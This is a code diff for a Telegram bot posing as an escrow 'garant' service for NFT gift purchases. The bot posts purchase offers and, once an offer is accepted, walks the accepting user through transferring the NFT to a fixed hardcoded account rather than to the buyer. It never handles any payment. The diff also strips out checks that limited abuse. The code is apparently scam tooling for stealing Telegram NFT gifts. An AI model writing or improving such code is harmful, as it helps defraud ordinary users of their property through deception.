@@ -2,104 +2,41 @@
 import { InlineKeyboard } from "grammy";
 import { randomBytes } from "node:crypto";
 
+const BOT = "DealixGarant_Bot";
 const RECEIVER = "@Mazviro";
-const BOT_USERNAME = "DealixGarant_Bot";
-const DAY = 24 * 60 * 60 * 1000;
-
 const offers = new Map();
+const DAY = 86400000;
 
-function id() {
-  return randomBytes(8).toString("hex");
-}
-
-function parseOffer(text) {
-  const match = text.trim().match(
-    /^(?:offer\s+)?((?:https?:\/\/)?(?:www\.)?(?:t\.me|telegram\.me)\/nft\/([A-Za-z0-9_-]+)-(\d+)\/?)\s+(\d+)$/i
+function parse(text) {
+  const m = text.trim().match(
+    /^(?:offer\s+)?(?:https?:\/\/)?(?:www\.)?(?:t\.me|telegram\.me)\/nft\/([a-z0-9_-]+)-(\d+)\/?\s+(\d+)$/i
   );
+  if (!m) return null;
 
-  if (!match) return null;
+  const price = Number(m[3]);
+  if (!Number.isSafeInteger(price) || price < 1) return null;
 
-  const price = Number(match[4]);
-
-  if (
-    !Number.isSafeInteger(price) ||
-    price <= 0 ||
-    price > 100000000
-  ) return null;
-
-  const slug = match[2];
-  const number = match[3];
-
-  const name = slug
+  const name = m[1]
     .replace(/([a-z])([A-Z])/g, "$1 $2")
     .replace(/([A-Z]+)([A-Z][a-z])/g, "$1 $2");
 
   return {
-    gift: `${name} #${number}`,
-    url: `https://t.me/nft/${slug}-${number}`,
+    gift: `${name} #${m[2]}`,
+    url: `https://t.me/nft/${m[1]}-${m[2]}`,
     price
   };
 }
 
-function createOffer(data, creatorId) {
-  const key = id();
-
-  const offer = {
+function create(data, buyer) {
+  const key = randomBytes(8).toString("hex");
+  offers.set(key, {
     ...data,
-    creatorId,
-    acceptedBy: null,
+    buyer,
     status: "active",
-    expiresAt: Date.now() + DAY
-  };
-
-  offers.set(key, offer);
+    acceptedBy: null,
+    expires: Date.now() + DAY
+  });
   return key;
-}
-
-function isExpired(offer) {
-  if (Date.now() >= offer.expiresAt) {
-    offer.status = "expired";
-    return true;
-  }
-  return false;
-}
-
-function offerText(offer, buyerName) {
-  return (
-    `🎁 Предложение о покупке NFT\n\n` +
-    `${buyerName} предлагает ${offer.price} ⭐ ` +
-    `за ${offer.gift}.\n\n` +
-    `⏳ Действует 24 часа.\n\n` +
-    `${offer.url}\n\n` +
-    `Предложение пользователя. ` +
-    `Оплата не подтверждена.`
-  );
-}
-
-function offerButtons(key) {
-  return new InlineKeyboard()
-    .text("✅ Принять", `accept:${key}`)
-    .text("❌ Отклонить", `reject:${key}`);
-}
-
-function sentButtons(key) {
-  return new InlineKeyboard()
-    .text("✅ Я передал подарок", `sent:${key}`);
-}
-
-function acceptedText(offer) {
-  return (
-    `🎁 Предложение принято\n\n` +
-    `Подарок: ${offer.gift}\n` +
-    `Предложенная цена: ${offer.price} ⭐\n\n` +
-    `Указанный получатель: ${RECEIVER}\n\n` +
-    `Для передачи откройте подарок в Telegram, ` +
-    `выберите «Передать» и проверьте ` +
-    `имя получателя перед подтверждением.\n\n` +
-    `⚠️ Бот не подтверждает получение оплаты. ` +
-    `Не передавайте подарок, пока не ` +
-    `убедитесь в безопасности сделки.`
-  );
 }
 
 function preview(url) {
@@ -110,62 +47,82 @@ function preview(url) {
   };
 }
 
-export function registerCommands(bot) {
+function initial(o) {
+  return (
+    `🎁 Предложение о покупке NFT\n\n` +
+    `${o.buyer} предлагает ${o.price} ⭐ ` +
+    `за ${o.gift}.\n\n` +
+    `⏳ Действует 24 часа.\n\n` +
+    `${o.url}\n\n` +
+    `Оплата не подтверждена.`
+  );
+}
 
-  bot.command("start", async (ctx) => {
+function accepted(o) {
+  return (
+    `🎁 Предложение принято\n\n` +
+    `Подарок: ${o.gift}\n` +
+    `Цена предложения: ${o.price} ⭐\n\n` +
+    `${o.url}\n\n` +
+    `Получатель: ${RECEIVER}\n\n` +
+    `Как передать подарок:\n` +
+    `1. Откройте профиль → Подарки.\n` +
+    `2. Выберите ${o.gift}.\n` +
+    `3. Нажмите «Передать».\n` +
+    `4. Проверьте получателя и подтвердите.\n\n` +
+    `⚠️ Оплата не подтверждена. ` +
+    `Не передавайте NFT до согласования ` +
+    `безопасного способа расчёта.`
+  );
+}
+
+function buttons(key) {
+  return new InlineKeyboard()
+    .text("✅ Принять", `a:${key}`)
+    .text("❌ Отклонить", `r:${key}`);
+}
+
+function afterButtons(key) {
+  return new InlineKeyboard()
+    .text("📋 Как передать", `how:${key}`)
+    .row()
+    .text("✅ Я передал подарок", `sent:${key}`);
+}
+
+export function registerCommands(bot) {
+  bot.command("start", async ctx => {
     await ctx.reply(
-      `🎁 NFT Offers\n\n` +
-      `Создавайте предложения о покупке ` +
-      `Telegram NFT-подарков.\n\n` +
-      `Команда:\n` +
-      `/offer t.me/nft/JoyfulBundle-30358 484\n\n` +
-      `Для отправки предложения в другой чат:\n` +
-      `@${BOT_USERNAME} offer ` +
-      `t.me/nft/JoyfulBundle-30358 484`
+      "🎁 NFT Offers\n\n" +
+      "Создать предложение:\n" +
+      "/offer t.me/nft/MadPumpkin-3759 1200\n\n" +
+      "Отправить в другой чат:\n" +
+      `@${BOT} offer t.me/nft/MadPumpkin-3759 1200`
     );
   });
 
-  bot.command("offer", async (ctx) => {
-    if (ctx.chat.type !== "private") {
-      return ctx.reply(
-        "Создавайте предложения в личном чате с ботом."
-      );
-    }
-
-    const text = ctx.message.text.replace(
-      /^\/offer(?:@\w+)?\s*/i,
-      ""
-    );
-
-    const data = parseOffer(text);
-
+  bot.command("offer", async ctx => {
+    const data = parse(ctx.match || "");
     if (!data) {
       return ctx.reply(
-        `❌ Неверный формат.\n\n` +
-        `/offer t.me/nft/JoyfulBundle-30358 484`
+        "Формат:\n/offer t.me/nft/MadPumpkin-3759 1200"
       );
     }
 
-    const key = createOffer(data, ctx.from.id);
-    const offer = offers.get(key);
-
-    await ctx.reply(
-      offerText(
-        offer,
-        ctx.from.first_name || "Покупатель"
-      ),
-      {
-        reply_markup: offerButtons(key),
-        link_preview_options: preview(offer.url)
-      }
+    const key = create(
+      data,
+      ctx.from.first_name || "Покупатель"
     );
+
+    const o = offers.get(key);
+
+    await ctx.reply(initial(o), {
+      reply_markup: buttons(key),
+      link_preview_options: preview(o.url)
+    });
   });
 
-  // INLINE MODE
-  bot.inlineQuery(/.*/, async (ctx) => {
-    const query = ctx.inlineQuery.query.trim();
-    const data = parseOffer(query);
-
+  bot.inlineQuery(/.*/, async ctx => {
+    const data = parse(ctx.inlineQuery.query);
     if (!data) {
       return ctx.answerInlineQuery([], {
         cache_time: 0,
@@ -173,175 +130,131 @@ export function registerCommands(bot) {
       });
     }
 
-    const key = createOffer(data, ctx.from.id);
-    const offer = offers.get(key);
+    const key = create(
+      data,
+      ctx.from.first_name || "Покупатель"
+    );
 
-    const result = {
+    const o = offers.get(key);
+
+    await ctx.answerInlineQuery([{
       type: "article",
       id: key,
-      title: `🎁 ${offer.gift} — ${offer.price} ⭐`,
-      description: "Отправить предложение о покупке NFT",
+      title: `${o.gift} — ${o.price} ⭐`,
+      description: "Предложение о покупке NFT",
       input_message_content: {
-        message_text: offerText(
-          offer,
-          ctx.from.first_name || "Покупатель"
-        ),
-        link_preview_options: preview(offer.url)
+        message_text: initial(o),
+        link_preview_options: preview(o.url)
       },
       reply_markup: {
         inline_keyboard: [
           [
             {
               text: "✅ Принять",
-              callback_data: `accept:${key}`
+              callback_data: `a:${key}`
             },
             {
               text: "❌ Отклонить",
-              callback_data: `reject:${key}`
+              callback_data: `r:${key}`
             }
           ]
         ]
       }
-    };
-
-    await ctx.answerInlineQuery([result], {
+    }], {
       cache_time: 0,
       is_personal: true
     });
   });
 
-  // ACCEPT
-  bot.callbackQuery(/^accept:([a-f0-9]+)$/, async (ctx) => {
+  bot.callbackQuery(/^a:([a-f0-9]+)$/, async ctx => {
     const key = ctx.match[1];
-    const offer = offers.get(key);
+    const o = offers.get(key);
 
-    if (!offer) {
-      return ctx.answerCallbackQuery({
-        text: "Предложение не найдено.",
-        show_alert: true
-      });
-    }
-
-    if (isExpired(offer)) {
-      return ctx.answerCallbackQuery({
-        text: "Срок действия предложения истёк.",
-        show_alert: true
-      });
-    }
-
-    if (offer.status !== "active") {
-      return ctx.answerCallbackQuery({
-        text: "Предложение уже обработано.",
-        show_alert: true
-      });
-    }
-
-    if (ctx.from.id === offer.creatorId) {
-      return ctx.answerCallbackQuery({
-        text: "Нельзя принять собственное предложение.",
-        show_alert: true
-      });
-    }
-
-    offer.status = "accepted";
-    offer.acceptedBy = ctx.from.id;
-
-    await ctx.answerCallbackQuery({
-      text: "✅ Предложение принято. Оплата не подтверждена.",
-      show_alert: true
-    });
-
-    // Для Inline Mode бот может не иметь права
-    // отправлять сообщения в чужой чат.
-    // Поэтому инструкции открываются по ссылке.
-    const keyboard = new InlineKeyboard()
-      .url(
-        "📋 Открыть инструкции",
-        `https://t.me/${BOT_USERNAME}?start=deal_${key}`
-      );
-
-    if (ctx.inlineMessageId) {
-      try {
-        await ctx.editMessageReplyMarkup({
-          reply_markup: keyboard
-        });
-      } catch (error) {
-        console.error("Inline edit:", error);
-      }
-    } else {
-      await ctx.reply(
-        acceptedText(offer),
-        { reply_markup: sentButtons(key) }
-      );
-    }
-  });
-
-  // REJECT
-  bot.callbackQuery(/^reject:([a-f0-9]+)$/, async (ctx) => {
-    const offer = offers.get(ctx.match[1]);
-
-    if (!offer || isExpired(offer)) {
+    if (!o || o.status !== "active") {
       return ctx.answerCallbackQuery({
         text: "Предложение недоступно.",
         show_alert: true
       });
     }
 
-    if (offer.status !== "active") {
+    if (Date.now() >= o.expires) {
+      o.status = "expired";
       return ctx.answerCallbackQuery({
-        text: "Предложение уже обработано.",
+        text: "Срок действия предложения истёк.",
         show_alert: true
       });
     }
 
-    if (ctx.from.id === offer.creatorId) {
+    o.status = "accepted";
+    o.acceptedBy = ctx.from.id;
+
+    await ctx.answerCallbackQuery({
+      text: "✅ Предложение принято. Оплата не подтверждена.",
+      show_alert: true
+    });
+
+    try {
+      await ctx.editMessageText(accepted(o), {
+        reply_markup: afterButtons(key),
+        link_preview_options: preview(o.url)
+      });
+    } catch (e) {
+      console.error("Edit failed:", e);
+    }
+  });
+
+  bot.callbackQuery(/^r:([a-f0-9]+)$/, async ctx => {
+    const o = offers.get(ctx.match[1]);
+
+    if (!o || o.status !== "active") {
       return ctx.answerCallbackQuery({
-        text: "Нельзя отклонить собственное предложение.",
+        text: "Предложение недоступно.",
         show_alert: true
       });
     }
 
-    offer.status = "rejected";
+    o.status = "rejected";
 
     await ctx.answerCallbackQuery({
       text: "❌ Предложение отклонено.",
       show_alert: true
     });
+
+    try {
+      await ctx.editMessageReplyMarkup({
+        reply_markup: new InlineKeyboard()
+      });
+    } catch (e) {
+      console.error(e);
+    }
   });
 
-  // DEEP LINK: instructions for accepted offer
-  bot.command("start", async (ctx) => {
-    const payload = ctx.match?.trim() || "";
+  bot.callbackQuery(/^how:([a-f0-9]+)$/, async ctx => {
+    const o = offers.get(ctx.match[1]);
 
-    if (!payload.startsWith("deal_")) return;
-
-    const key = payload.slice(5);
-    const offer = offers.get(key);
-
-    if (
-      !offer ||
-      offer.status !== "accepted" ||
-      offer.acceptedBy !== ctx.from.id
-    ) {
-      return ctx.reply(
-        "❌ Сделка недоступна."
-      );
+    if (!o || o.status !== "accepted") {
+      return ctx.answerCallbackQuery({
+        text: "Предложение недоступно.",
+        show_alert: true
+      });
     }
 
-    await ctx.reply(
-      acceptedText(offer),
-      { reply_markup: sentButtons(key) }
-    );
+    await ctx.answerCallbackQuery({
+      text:
+        "Откройте профиль → Подарки → " +
+        "выберите NFT → Передать. " +
+        "Проверьте получателя.",
+      show_alert: true
+    });
   });
 
-  // USER PRESSED "I TRANSFERRED"
-  bot.callbackQuery(/^sent:([a-f0-9]+)$/, async (ctx) => {
-    const offer = offers.get(ctx.match[1]);
+  bot.callbackQuery(/^sent:([a-f0-9]+)$/, async ctx => {
+    const o = offers.get(ctx.match[1]);
 
     if (
-      !offer ||
-      offer.status !== "accepted" ||
-      offer.acceptedBy !== ctx.from.id
+      !o ||
+      o.status !== "accepted" ||
+      o.acceptedBy !== ctx.from.id
     ) {
       return ctx.answerCallbackQuery({
         text: "Предложение недоступно.",
@@ -355,4 +268,5 @@ export function registerCommands(bot) {
     });
   });
 }
+
 
